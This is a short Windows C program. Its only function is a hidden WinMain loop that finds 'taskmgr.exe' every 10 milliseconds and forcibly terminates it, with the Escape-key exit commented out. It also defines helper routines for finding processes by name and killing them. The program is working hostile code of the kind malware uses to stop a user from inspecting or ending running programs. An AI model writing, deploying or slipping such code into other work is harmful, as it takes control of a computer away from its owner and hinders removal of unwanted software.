#include <windows.h>
#include <TlHelp32.h>

BOOL FindProcessByExeFileName(CONST CHAR * ProcessName)
{
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    BOOL bRet = Process32First(hProcessSnap, &processEntry);
    while (bRet)
    {
        if (!stricmp(ProcessName, processEntry.szExeFile))
        {
            CloseHandle(hProcessSnap);
            return TRUE;
        }
        bRet = Process32Next(hProcessSnap, &processEntry);
    }
    CloseHandle(hProcessSnap);

    return FALSE;
}

DWORD GetProcessIdByExeFileName(CONST CHAR * ProcessName)
{
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    BOOL bRet = Process32First(hProcessSnap, &processEntry);
    while (bRet)
    {
        if (!stricmp(ProcessName, processEntry.szExeFile))
        {
            CloseHandle(hProcessSnap);
            return processEntry.th32ProcessID;
        }
        bRet = Process32Next(hProcessSnap, &processEntry);
    }
    CloseHandle(hProcessSnap);
    return (-1);
}

VOID KillProcess(DWORD ProcessId)
{
    HANDLE hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
    TerminateProcess(hProcess,0);
    CloseHandle(hProcess);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
    DWORD ProcessId;

	//while (!GetAsyncKeyState(VK_ESCAPE))
	while (1)
    {
        ProcessId = GetProcessIdByExeFileName("taskmgr.exe");
        if (ProcessId != (DWORD)(-1))
            KillProcess(ProcessId);
        Sleep(10);
    }

    return 0;
}
